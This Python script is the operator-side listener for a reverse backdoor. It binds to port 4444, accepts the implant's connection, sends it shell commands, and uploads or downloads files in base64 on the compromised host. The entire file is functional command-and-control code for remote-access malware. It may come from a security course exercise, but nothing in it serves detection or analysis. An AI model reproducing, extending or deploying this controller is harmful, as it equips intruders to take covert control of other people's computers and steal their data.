#! /usr/bin/env python
# NOTICE: This script is used as a listener for 'reverse_backdoor.py' script.
# Compatibility: Python 3 only.

import base64
import json
import socket


class Listener:
    def __init__(self, ip_address, port):
        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener_socket.bind((ip_address, port))
        listener_socket.listen(0)
        # TODO: implement loading animation with spinner (progress lib)
        print("[+] Waiting for incoming connection...")
        self.connection, address = listener_socket.accept()
        print(f"[+] Connection established! Source: {address}.")

    def reliable_send(self, data: str):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(" >> ")
            command = command.split()

            # try:
            if command[0] == "upload":
                file_content = self.read_file(command[1]).decode()
                command.append(file_content)

            result = self.execute_remotely(command)

            if command[0] == "download" and "[-] Error " not in result:
                result = self.write_file(command[1], result)
            # except Exception:
            # result = "[-] Error has occurred during command execution."

            print(result)


listener = Listener("10.0.2.15", 4444)
listener.run()
